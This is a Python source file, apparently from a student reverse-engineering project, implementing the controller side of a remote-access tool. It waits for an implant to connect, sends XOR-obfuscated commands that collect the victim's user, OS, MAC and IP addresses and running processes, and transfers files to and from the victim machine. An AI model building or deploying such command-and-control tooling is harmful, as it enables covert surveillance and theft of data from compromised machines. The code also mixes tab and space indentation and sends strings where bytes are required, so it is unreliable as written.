import socket
import base64

ip = '127.0.0.1'
port = 12345

commands = ['exit', 'getUser', 'getOS', 'getMAC', 'getIP', 'getProc', 'download', 'upload']



#XOR encode data
def xor_encode(data):
    xored_data = ""
    for c in data:
        xored_data += chr(ord(c) ^ 0x69)
    xored_data += chr(0)
    return xored_data

def main():

    #Set up socket and listen for a connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    conn, addr = s.accept()

    while (1):
        #Get command and check if it is valid
    	command = input("Enter command: ")
    	if command not in commands:
    		print ("Invalid Command")
    		continue

        #Close socket
        if (command == "exit"):
            s.close()
            break
        
        #Send command to the client
        conn.send(xor_encode(command))

        #Receive the file from client
        if command == "download":
            path = "C:/Users/mcraf/CLionProjects/Final_Reverse_Proj/download2.txt"
            #path = input("Enter path: ")
            data = conn.recv(100000)
            filedata = data.decode()
            with open(path, 'w') as f:
                f.write(filedata)
            continue

        #Send file to the client
        if (command == "upload"):
            filename = "download.txt"
            #filename = raw_input("Enter filename: ")
            with open(filename, 'rb') as f:
                content = f.read()
                conn.send(content)
                #conn.send(xor_encode(content))
            continue

        #Receive data from client
    	data = conn.recv(10000)
    	print(data.decode())

#Run the main server function
main()
